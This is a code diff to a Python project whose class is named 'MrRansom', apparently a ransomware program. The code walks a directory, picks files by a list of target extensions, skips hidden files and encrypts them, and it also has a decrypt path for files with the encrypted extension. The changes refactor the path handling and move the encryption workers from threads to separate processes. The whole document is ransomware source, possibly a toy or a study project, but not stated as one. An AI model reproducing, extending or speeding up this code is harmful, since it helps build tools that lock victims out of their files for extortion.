@@ -2,7 +2,7 @@ import base64
 import json
 import os
 import time
-from threading import Thread
+from multiprocessing import Process
 
 from file_util import put_file, get_file, get_full_path
 from blockencrypter import BlockEncrypter, get_blocks
@@ -25,30 +25,23 @@ def get_file_types_to_encrypt():
 FILE_TYPES_TO_ENCRYPT = get_file_types_to_encrypt()
 
 
-def get_files_to_process(files, mode):
+def get_files_to_process(files, root_dir, mode):
     files_to_process = []
     for file_path in files:
-        if should_encrypt_file(file_path, mode) or should_decrypt_file(file_path, mode):
-            files_to_process.append(file_path)
+        if mode == ENCRYPT and can_encrypt_file(file_path) \
+                or mode == DECRYPT and can_decrypt_file(file_path):
+            files_to_process.append(os.path.join(root_dir, file_path))
 
     return files_to_process
 
 
-def should_encrypt_file(file_name, mode):
-    return mode == ENCRYPT and is_valid_file(file_name)
-
-
-def should_decrypt_file(file_name, mode):
-    return mode == DECRYPT and is_encrypted_file(file_name)
-
-
-def is_valid_file(filename):
+def can_encrypt_file(filename):
     for file_type in FILE_TYPES_TO_ENCRYPT:
-        if filename.endswith(file_type) and not filename.startswith("."):
+        if filename.endswith(file_type) and not os.path.basename(filename).startswith("."):
             return True
 
 
-def is_encrypted_file(file_name):
+def can_decrypt_file(file_name):
     if file_name.endswith(ENCRYPTED_EXTENSION):
         return True
 
@@ -72,16 +65,16 @@ class MrRansom:
 
     def __init__(self, root_dir, key):
         self.key = key
-        self.root_dir = os.path.realpath(root_dir)
-        self.files = [os.path.join(self.root_dir, file_name) for file_name in os.listdir(self.root_dir)]
+        self.root_dir = root_dir
+        self.files = [file_name for file_name in os.listdir(self.root_dir)]
 
     def encrypt(self):
-        files_to_encrypt = get_files_to_process(self.files, ENCRYPT)
+        files_to_encrypt = get_files_to_process(self.files, self.root_dir, ENCRYPT)
 
         self.process(files_to_encrypt, self.encrypt_file, ENCRYPT)
 
     def decrypt(self):
-        files_to_decrypt = get_files_to_process(self.files, DECRYPT)
+        files_to_decrypt = get_files_to_process(self.files, self.root_dir, DECRYPT)
 
         self.process(files_to_decrypt, self.decrypt_file, DECRYPT)
 
@@ -91,7 +84,7 @@ class MrRansom:
 
         workers = []
         for file_path in files:
-            thread = Thread(target=method, args=get_process_args(file_path, mode))
+            thread = Process(target=method, args=get_process_args(file_path, mode))
 
             workers.append(thread)
 
